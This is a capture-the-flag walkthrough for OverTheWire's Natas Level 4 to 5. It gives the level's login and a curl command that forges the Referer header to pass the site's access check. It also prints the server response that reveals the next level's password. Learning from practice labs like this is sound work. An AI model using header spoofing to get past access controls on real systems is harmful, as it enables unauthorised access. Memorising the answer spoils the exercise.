# Natas Level 4 → Level 5
(Updated: 13 August 2025)

## Credentials
- **Username:** `natas4`
- **Password:** `QryZXc2e0zahULdHrtHxzyYkj59kUxLQ`

## Connection
Level url: [http://natas4.natas.labs.overthewire.org/](http://natas4.natas.labs.overthewire.org/)

## Steps to Solve
1. Step 1 - You can access the code by doing the shortcut `Cmd + Shift + C` (for Mac) or `Ctrl + Shift + C` (for Windows)
2. Step 2 - You can see there is nothing else. The message says we have to access to it from `natas5` website Url, so we have to do it
3. Step 3 - Access your computer command line and paste this command:
```
curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ -H "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org/
```
- `-u natas4:<password>`: Add the authorization to the request
- `Referer: <nastas5 Url>`: Add the from url to solve the error.
Result:
```
<body>
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
```
4. Step 4 - Take the password to the next level.

## Next Level Password
`0n35PkggAPm2zbEpOU802c0x0Msn1ToK`
